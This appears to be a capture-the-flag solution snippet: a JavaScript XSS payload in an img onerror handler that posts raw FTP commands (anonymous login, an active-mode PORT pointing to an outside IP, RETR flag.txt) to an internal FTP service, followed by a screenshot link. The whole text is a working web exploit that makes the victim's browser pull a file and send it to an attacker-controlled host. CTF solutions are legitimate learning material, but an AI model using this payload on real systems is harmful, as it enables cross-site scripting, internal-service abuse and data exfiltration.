```js
"<img src=x onerror=\"\n\n
var myIP = '3,127,254,222'; \n\n\n
var ftpCommands =
'USER anonymous\\r\\n' +\n\n
'PASS anonymous\\r\\n' +
'TYPE I\\r\\n'+
'PORT  3,67,124,50,46,122  \\r\\n' +
'RETR flag.txt\\r\\n';    
var xhr = new XMLHttpRequest();
xhr.open('POST', '//ftp:2121', true);
xhr.send(ftpCommands);"> "
```
<img width="1763" height="766" alt="image" src="https://github.com/user-attachments/assets/1278376c-3e94-4f7b-a970-b64f2415b92f" />
